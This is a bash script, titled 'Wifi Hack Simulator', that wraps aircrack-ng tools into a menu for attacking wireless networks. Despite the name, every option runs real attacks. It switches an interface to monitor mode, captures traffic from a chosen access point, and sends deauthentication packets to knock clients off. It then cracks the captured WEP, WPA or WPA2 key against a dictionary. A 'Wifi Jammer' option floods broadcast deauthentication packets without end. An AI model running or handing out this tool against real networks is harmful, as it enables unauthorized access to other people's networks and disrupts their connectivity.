
KILL(){
	echo ""
	airmon-ng start wlan0
	sleep 2
	echo "Killing Processes...."
	airmon-ng check kill
	echo "Killing Processes done...."
	echo ""
	MENU
}
INT(){
	airmon-ng;
	read -p "Interface> " int
	echo ""
	if [ $int == "" ]; then
		echo "No Interface is selected"
		INT
	else
		echo "Selecting Interface: " $int
		KILL
	fi
}
WEP(){
	clear
	echo ""
	echo "Running script on Interface: " $int
	sleep 2
	airodump-ng $int
	read -p "Select BSSID> " bssid
	read -p "Select channel> " channel
	read -p "Enter the complete location of file to store captured data> " loc
	echo ""
	echo "Starting attack..."
	sleep 2
	clear
	echo "Press Control-C to stop capturing..."
	airodump-ng --bssid $bssid -c $channel -w $loc $int
	echo ""
	read -p "Want to Start cracking file? " crack
	if [ $crack = y ]; then
		read -p "Please Enter the dictionary file for cracking> " crackfile
		sleep 2
		CRACK
	else
		exit
	fi
}
WPA(){
	clear
	echo "Press Control-C to stop listening..."
	airodump-ng $int
	echo ""
	read -p "Enter the BSSID> " bssid
	read -p "Select channel> " channel
	read -p "Enter the complete location of file to store captured data> " loc
	echo ""
	echo "Starting attack..."
	sleep 2
	clear
	echo "Press Control-C to stop capturing..."
	airodump-ng --bssid $bssid -c $channel -w $loc $int
	echo ""
	read -p "Want to Start to crack the file? " crack
	if [ $crack = y ]; then
		read -p "Please Enter the dictionary file for cracking> " crackfile
		sleep 2
		CRACK
	else
		exit
	fi
}
WPA2(){
	clear
	echo "Press Control-C to stop listening..."
	airodump-ng $int
	echo ""
	read -p "Enter the BSSID> " bssid
	read -p "Select channel> " channel
	read -p "Enter the complete location of file to store captured data> " loc
	read -p "Enter the user BSSID to DEAUTH> " userid
	echo ""
	echo "Starting attack..."
	sleep 2
	clear
	echo "Press Control-C to stop capturing..."
	gnome-terminal --command aireplay-ng -0 20 -a $bssid -c $userid $int
	airodump-ng --bssid $bssid -c $channel -w $loc $int
	echo ""
	read -p "Want to Start to crack the file? " crack
	if [ $crack = y ]; then
		read -p "Please Enter the dictionary file for cracking> " crackfile
		read -p "Please Enter the captured file full location> " capturefull
		sleep 2
		CRACK
	else
		exit
	fi
}
CRACK(){
        echo "Starting the crack...."
        sleep 1
        aircrack-ng $capturefull -w $crackfile
        echo "Password is cracked... Enjoy!"
}
JAM(){
	clear
	echo ""
	airodump-ng $int
	START_JAM
}
START_JAM(){
	echo ""
	read -p "Enter BSSID to Jam> " jam
	read -p "Enter the Fake AP> " fake
	echo ""
	if [ $jam = "" ]; then
		echo "Please enter a network BSSID to jam..."
		START_JAM
	else
		clear
		echo "Starting to Jam the Network by sending De-Authentication Packets..."
		sleep 3
		echo "Press Control-C to close..."
		aireplay-ng -0 0 -a $jam -c FF:FF:FF:FF:FF:FF $int
	fi
}
MENU(){
	echo "Please Select one method: "
	echo "1> WEP"
	echo "2> WPA"
	echo "3> WPA2"
	echo "4> Wifi Jammer"
	read -p "Enter your choice> " choice
	if [ $choice = 1 ]; then
		echo "Starting WEP hack tool..."
		WEP
	fi
	if [ $choice = 2 ]; then
		echo "Starting WPA hack tool..."
		WPA
	fi
	if [ $choice = 3 ]; then
		echo "Starting WPA2 hack tool..."
		WPA2
	fi
	if [ $choice = 4 ]; then
		echo "Starting Jamming Script..."
		sleep 2
		JAM
	fi
}

echo "========================="
echo "   Wifi Hack Simulator   "
echo "========================="
echo "    By Suraj Aggarwal    "
echo "========================="
echo ""
echo ""
INT
